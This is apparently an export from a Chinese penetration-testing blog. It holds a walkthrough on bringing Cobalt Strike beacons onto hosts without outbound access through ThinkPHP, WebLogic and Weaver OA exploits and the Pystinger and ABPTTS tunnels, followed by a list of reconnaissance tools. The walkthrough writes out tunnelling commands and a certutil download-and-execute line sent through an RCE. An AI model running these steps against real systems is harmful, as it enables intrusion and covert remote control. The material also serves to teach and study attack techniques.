        <content type="html"><![CDATA[<h1 id="Cs在不出网环境中上线"><a href="#Cs在不出网环境中上线" class="headerlink" title="Cs在不出网环境中上线"></a>Cs在不出网环境中上线</h1><h2 id="适用环境"><a href="#适用环境" class="headerlink" title="适用环境"></a>适用环境</h2><p>在渗透的测试中，经常遇到有些目标只对外开放了http服务，由于路由设置或防火墙等原因，导致攻击者在拿下webshell后却不能通过反弹shell正常上线到攻击者的C2服务器上无法继续进一步对内网进行测试或者提权，在这种情况下，就需要通过一些姿势来达到上线到C2服务器的目的。</p><h2 id="测试目标出网情况"><a href="#测试目标出网情况" class="headerlink" title="测试目标出网情况"></a>测试目标出网情况</h2><p>机器有dns、icmp、tcp、http等可出网的通信协议，因此要测试出目标可以通过哪种协议对外通信，结合起来对目标综合测试。当确定目标多种通信方式都不可支持，只能思考是否能通过http端口来实现上线的目的。</p><h2 id="利用Pystinger-上线不出网主机"><a href="#利用Pystinger-上线不出网主机" class="headerlink" title="利用Pystinger 上线不出网主机"></a>利用Pystinger 上线不出网主机</h2><h3 id="Pystinger"><a href="#Pystinger" class="headerlink" title="Pystinger"></a>Pystinger</h3><p>毒刺(pystinger)通过webshell实现<strong>内网SOCK4代理</strong>,<strong>端口映射</strong>.</p><p>可直接用于metasploit-framework,viper,cobalt strike上线.</p><p>主体使用python开发,当前支持php,jsp(x),aspx三种代理脚本.</p><p>具体思路可参考文章<a href="https://mp.weixin.qq.com/s?__biz=MzI4MzA0ODUwNw==&mid=2247484958&idx=1&sn=a6fcfa2f4b7c5e1d0b3d3a368b4c92ef&chksm=eb91e94adce6605cbd9f2716d69d11b805448edb215ecff160003ea4b87f5749862c6db58491&scene=21#wechat_redirect">红队攻防实践：不出网主机搭建内网隧道新思路</a></p><p>项目地址：<a href="https://github.com/FunnyWolf/pystinger">https://github.com/FunnyWolf/pystinger</a></p><h3 id="具体使用"><a href="#具体使用" class="headerlink" title="具体使用"></a>具体使用</h3><p>目标机器http服务上运行着tp框架，通过报错得到了具体版本为V5.0.22</p><p><img src="cs%E5%9C%A8%E4%B8%8D%E5%87%BA%E7%BD%91%E7%8E%AF%E5%A2%83%E4%B8%AD%E4%B8%8A%E7%BA%BF/image-20211031212309372.png"></p><p>经过测试存在tp5命令执行，写入webshell</p><p><img src="cs%E5%9C%A8%E4%B8%8D%E5%87%BA%E7%BD%91%E7%8E%AF%E5%A2%83%E4%B8%AD%E4%B8%8A%E7%BA%BF/image-20211031213554829.png"></p><p>通过测试，目标不出网，也只开放了80端口允许流量进入，由于通信限制，我们即选择使用pystinger来达到上线到c2的目的。</p><p>工具内主要有server服务端、client客户端与webshell脚本文件三部分组成。</p><p><img src="cs%E5%9C%A8%E4%B8%8D%E5%87%BA%E7%BD%91%E7%8E%AF%E5%A2%83%E4%B8%AD%E4%B8%8A%E7%BA%BF/image-20211031211939455.png"></p><p>将php脚本文件和stinger_server.exe上传到目标机器中。</p><p><img src="cs%E5%9C%A8%E4%B8%8D%E5%87%BA%E7%BD%91%E7%8E%AF%E5%A2%83%E4%B8%AD%E4%B8%8A%E7%BA%BF/image-20211031214438084.png"></p><p>访问proxy.php，访问出现UTF-8则表示脚本正常，如果报错可能是上传时传输出现问题，可以使用蚁剑编辑保存再尝试访问。</p><p><img src="cs%E5%9C%A8%E4%B8%8D%E5%87%BA%E7%BD%91%E7%8E%AF%E5%A2%83%E4%B8%AD%E4%B8%8A%E7%BA%BF/image-20211031214846431.png"></p><p>然后在目标上运行工具服务端</p><p><code>stinger_server.exe 0.0.0.0</code></p><p><img src="cs%E5%9C%A8%E4%B8%8D%E5%87%BA%E7%BD%91%E7%8E%AF%E5%A2%83%E4%B8%AD%E4%B8%8A%E7%BA%BF/image-20211031215135786.png"></p><p>在C2服务器上运行工具客户端，-w参数为目标url，-l参数为自身ip，一般为127.0.0.1，-p参数为目标webshell流量转发到C2的端口号</p><p><code>.\stinger_client.exe -w http://192.168.93.216/proxy.php -l 127.0.0.1 -p 60000</code></p><p><code>./stinger_client -w http://192.168.93.216/proxy.php -l 127.0.0.1 -p 60000</code></p><p><img src="cs%E5%9C%A8%E4%B8%8D%E5%87%BA%E7%BD%91%E7%8E%AF%E5%A2%83%E4%B8%AD%E4%B8%8A%E7%BA%BF/image-20211031220114874.png"><img src="cs%E5%9C%A8%E4%B8%8D%E5%87%BA%E7%BD%91%E7%8E%AF%E5%A2%83%E4%B8%AD%E4%B8%8A%E7%BA%BF/image-20211101091248245.png"></p><p> C2服务器新建HTTP监听，host为127.0.0.1，port为默认的60020。如果要上线内网多台主机则将hosts设置为不出网的内网ip即可。</p><p><img src="cs%E5%9C%A8%E4%B8%8D%E5%87%BA%E7%BD%91%E7%8E%AF%E5%A2%83%E4%B8%AD%E4%B8%8A%E7%BA%BF/image-20211031220453962.png"></p><p>通过该监听生成反弹shell，在目标机器上运行，这时查看cs，发现成功上线，查看client可以看到服务端传递流量的一个情况，该机器提权也可以使用该监听回弹shell。</p><p><img src="cs%E5%9C%A8%E4%B8%8D%E5%87%BA%E7%BD%91%E7%8E%AF%E5%A2%83%E4%B8%AD%E4%B8%8A%E7%BA%BF/image-20211101094356110.png"></p><p><img src="cs%E5%9C%A8%E4%B8%8D%E5%87%BA%E7%BD%91%E7%8E%AF%E5%A2%83%E4%B8%AD%E4%B8%8A%E7%BA%BF/image-20211101093326660.png"></p><h2 id="通过正向连接上线cs"><a href="#通过正向连接上线cs" class="headerlink" title="通过正向连接上线cs"></a>通过正向连接上线cs</h2><h3 id="ABPTTS建立HTTP隧道"><a href="#ABPTTS建立HTTP隧道" class="headerlink" title="ABPTTS建立HTTP隧道"></a>ABPTTS建立HTTP隧道</h3><p>目标存在Weblogic服务，测试发现存在反序列化漏洞，写入webshell</p><p><img src="cs%E5%9C%A8%E4%B8%8D%E5%87%BA%E7%BD%91%E7%8E%AF%E5%A2%83%E4%B8%AD%E4%B8%8A%E7%BA%BF/image-20211101112012798.png"></p><p>目标不出网且仅有7001端口能够与服务器通信，这里选择使用http隧道工具，如Neo-reGeorg、reGeorg，但是这里并不适用，因为cs上线要将beacon经过这条http隧道再去正向连接目标端口，但是Neo-reGeorg、reGeorg为并不能实现端口对端口的映射，由此并不能满足这里的条件。</p><p>因此这里选择ABPTTS，虽然它有全加密对抗检测和稳定的优点，但是我们主要是因为其具有端口对端口映射的功能而选择这款工具，不过该工具只支持aspx与jsp两种脚本文件。</p><p>访问得到一串密文，说明脚本文件正常运行</p><p><img src="cs%E5%9C%A8%E4%B8%8D%E5%87%BA%E7%BD%91%E7%8E%AF%E5%A2%83%E4%B8%AD%E4%B8%8A%E7%BA%BF/image-20211101113305878.png"></p><p>客户端适用命令，将本机的5555端口通过http隧道映射至6666端口</p><p><code>Python2 abpttsclient.py -c server/config.txt -u &quot;http://192.168.93.186:7001/wls-wsat/ABPTTS.jsp&quot; -f 127.0.0.1:5555/127.0.0.1:6666</code></p><p><img src="cs%E5%9C%A8%E4%B8%8D%E5%87%BA%E7%BD%91%E7%8E%AF%E5%A2%83%E4%B8%AD%E4%B8%8A%E7%BA%BF/image-20211101113713768.png"></p><h3 id="通过HTTP隧道正向连接"><a href="#通过HTTP隧道正向连接" class="headerlink" title="通过HTTP隧道正向连接"></a>通过HTTP隧道正向连接</h3><p>Cs新建bind监听，监听端口为6666</p><p><img src="cs%E5%9C%A8%E4%B8%8D%E5%87%BA%E7%BD%91%E7%8E%AF%E5%A2%83%E4%B8%AD%E4%B8%8A%E7%BA%BF/image-20211101114037590.png"></p><p>通过该监听生成正向载荷（在生成正向载荷的时候只能选择stageless Beacon ）</p><p>上传到目标服务器上执行，返回Cs本机shell（本机shell就是让本机自己上Cshhhhh~），在本机shell上执行<strong>connect 127.0.0.1 5555</strong>，这时目标已经上线。</p><p><img src="cs%E5%9C%A8%E4%B8%8D%E5%87%BA%E7%BD%91%E7%8E%AF%E5%A2%83%E4%B8%AD%E4%B8%8A%E7%BA%BF/image-20211101114614547.png"><img src="cs%E5%9C%A8%E4%B8%8D%E5%87%BA%E7%BD%91%E7%8E%AF%E5%A2%83%E4%B8%AD%E4%B8%8A%E7%BA%BF/image-20211101114647706.png"></p><h2 id="Cs利用跳板上线不出网主机"><a href="#Cs利用跳板上线不出网主机" class="headerlink" title="Cs利用跳板上线不出网主机"></a>Cs利用跳板上线不出网主机</h2><p>当我们取得边界机器权限后却发现内网机器不出网，这时可以利用已经得到权限的机器作为跳板通过bind的方式去拿下内网主机。</p><p>方法多种多样，这里列举一种较为简单的方法。</p><p>这里我们已经获取到外网边界主机的权限，其内网ip为192.168.1.118，经探测发现192.168.1.123为泛微oa，其存在rce。</p><p><img src="cs%E5%9C%A8%E4%B8%8D%E5%87%BA%E7%BD%91%E7%8E%AF%E5%A2%83%E4%B8%AD%E4%B8%8A%E7%BA%BF/image-20211102091609911.png"></p><p>首先在cs中生成一个bind型的监听</p><p><img src="cs%E5%9C%A8%E4%B8%8D%E5%87%BA%E7%BD%91%E7%8E%AF%E5%A2%83%E4%B8%AD%E4%B8%8A%E7%BA%BF/image-20211102091739379.png"></p><p>再通过该监听生成stageless型的马，cs中bind型监听只能stageless型马，stager+payload全写死在木马中，相比较于Stager型体积更大，特征码更明显。</p><p>注：stager 其实是一段很简单的加载器。应该是 socketedi 协议请求一段 shellcode，加载到内存里，功能单一，这个地方可能没考虑到中间代理的问题。 stager 就做了一件事情，就是请求一个 IP 端口，然后控制端发送一段数据，前4个字节是 shellcode 长度，后面是  shellcode，然后收到数据后，跳转到 shellcode 开始运行。而 stageless 会把几个分阶段的 shellcode 以及  Reflect 的 dll 合并到一个文件里（反射型dll加载）。<a href="http://blog.leanote.com/post/snowming/2ec80f7823e0">参考链接</a></p><p>将生成的bind马放到边界服务器192.168.1.118的web目录下，内网可正常访问且下载即可</p><p><img src="cs%E5%9C%A8%E4%B8%8D%E5%87%BA%E7%BD%91%E7%8E%AF%E5%A2%83%E4%B8%AD%E4%B8%8A%E7%BA%BF/image-20211102092825665.png"></p><p>泛微oa rce的利用，路径 <strong>/weaver/bsh.servlet.BshServlet</strong></p><p><code>exec(&quot;cmd /c certutil -urlcache -split -f http://192.168.1.118/123.exe&quot;) </code></p><p><code>exec(&quot;cmd /c 123.exe&quot;)</code></p><p>目标成功执行之后，返回到192.168.1.118的shell中</p><p><code>connect 192.168.1.123 7777</code></p><p>发现目标带着链接符号成功上线到cs中</p><p><img src="cs%E5%9C%A8%E4%B8%8D%E5%87%BA%E7%BD%91%E7%8E%AF%E5%A2%83%E4%B8%AD%E4%B8%8A%E7%BA%BF/image-20211102093511147.png"></p>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 红蓝对抗 </tag>
            
            <tag> 渗透测试 </tag>
            
            <tag> Cs </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>信息收集</title>
      <link href="/2021/10/29/xin-xi-shou-ji/"/>
      <url>/2021/10/29/xin-xi-shou-ji/</url>
      
        <content type="html"><![CDATA[<h1 id="web安全-信息收集"><a href="#web安全-信息收集" class="headerlink" title="web安全-信息收集"></a>web安全-信息收集</h1><h2 id="一、收集域名信息"><a href="#一、收集域名信息" class="headerlink" title="一、收集域名信息"></a>一、收集域名信息</h2><ol><li><p>whois 查询</p><p><a href="https://whois.aizhan.com/">爱站工具网</a> <a href="https://whois.chinaz.com/">站长之家</a> <a href="http://www.virustotal.com/">VirusTotal</a></p></li><li><p>备案信息查询</p><p><a href="https://www.beianbeian.com/">ICP备案查询网</a> <a href="https://www.tianyancha.com/">天眼查</a></p></li></ol><h2 id="二、收集敏感信息"><a href="#二、收集敏感信息" class="headerlink" title="二、收集敏感信息"></a>二、收集敏感信息</h2><p>Google hack</p><p>shodan等网络空间搜索引擎</p><p>中间件、敏感文件、敏感信息、服务信息</p><p>github</p><h2 id="三、收集子域名信息"><a href="#三、收集子域名信息" class="headerlink" title="三、收集子域名信息"></a>三、收集子域名信息</h2><ol><li><p>子域名检测工具<br>Layer子域名挖掘机、Sublist3r、subDomainsBrute</p></li><li><p>搜索引擎枚举</p><p>site:baidu.com</p></li><li><p>第三方聚合应用枚举</p><p><a href="https://dnsdumpster.com/">DNSdumpster</a>、在线DNS侦查</p></li><li><p>证书透明度公开日志枚举</p><p><a href="https://crt.sh/">crt.sh</a> 、 <a href="https://censys.io/">censys</a></p></li><li><p>在线网站</p><p>子域名爆破(<a href="https://phpinfo.me/domain)%E3%80%81ip%E5%8F%8D%E6%9F%A5%E7%BB%91%E5%AE%9A%E5%9F%9F%E5%90%8D%E7%BD%91%E7%AB%99(https://dns.aizhan.com)">https://phpinfo.me/domain)、ip反查绑定域名网站(https://dns.aizhan.com)</a></p></li></ol><h2 id="四、收集常用端口工具"><a href="#四、收集常用端口工具" class="headerlink" title="四、收集常用端口工具"></a>四、收集常用端口工具</h2><ol><li><p>端口扫描工具</p><p>Nmap、Masscan、ZMap、御剑高速TCP端口扫描、网络空间引擎</p></li><li><p>常见端口</p></li></ol><h2 id="五、指纹识别"><a href="#五、指纹识别" class="headerlink" title="五、指纹识别"></a>五、指纹识别</h2><ol><li><p>指纹有哪些内容</p><p>网站CMS指纹识别、计算机操作系统、Web容器指纹 （属于网络资产）</p></li><li><p>指纹识别工具</p><p>御剑web指纹识别、Whatweb、WebRobo、椰树、轻量WEB指纹识别等</p><p>在线指纹识别：<a href="https://whatweb.bugscaner.com/look/">BugScaner</a>、<a href="https://www.yunsee.cn/finger.html">云悉指纹</a>、<a href="https://whatweb.net/">whatweb</a></p></li></ol><h2 id="六、查找真实IP"><a href="#六、查找真实IP" class="headerlink" title="六、查找真实IP"></a>六、查找真实IP</h2><ol><li><p>目标服务器存在CDN</p><p>CDN指的是内容分发网络，主要解决因传输距离和不同运营商节点造成的网络速度性能低下的问题</p><p>静态数据资源直接缓存到节点服务器上，只有发生实际数据交互时才会从远程Web服务器上响应</p><p>目的：提高网站响应速度及用户体验</p></li></ol><ol start="2"><li><p>判断目标是否使用了CDN</p><p>多地ping观察IP，在线网站<a href="https://17ce.com/">17CE</a></p></li></ol><ol start="3"><li><p>绕过CDN寻找真实IP的常规方法</p><ul><li><p>内部邮箱源</p></li><li><p>扫描网站测试文件，如phpinfo，或某些敏感信息</p></li><li><p>分站域名</p></li><li><p>国外访问</p><p>国外在线代理网站<a href="https://asm.ca.com/en/ping.php">App Synthetic Monitor</a></p></li><li><p>查询域名的解析记录</p><p><a href="https://sitereport.netcraft.com/">NETCRAFT</a></p></li><li><p>抓取目标网站的APP的请求查找真实IP</p></li><li><p>绕过CloudFlare CDN查找真实IP</p></li></ul></li><li><p>验证获取的IP</p><p>尝试用IP访问能否正常访问到目标网站，如果是得到较大IP段就批量扫描哪些IP开了80、443、8080端口，然后逐个访问</p></li></ol><h2 id="七、收集敏感目录文件"><a href="#七、收集敏感目录文件" class="headerlink" title="七、收集敏感目录文件"></a>七、收集敏感目录文件</h2><ol><li><p>目录扫描工具</p><p>DirBuster、御剑后台扫描珍藏版、wwwscan、Spinder.py、Sensitivefilescan、Weakfilescan</p></li></ol><h2 id="八、社会工程学"><a href="#八、社会工程学" class="headerlink" title="八、社会工程学"></a>八、社会工程学</h2>]]></content>
      
      
      <categories>
          
          <category> Web攻防 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web攻防 </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
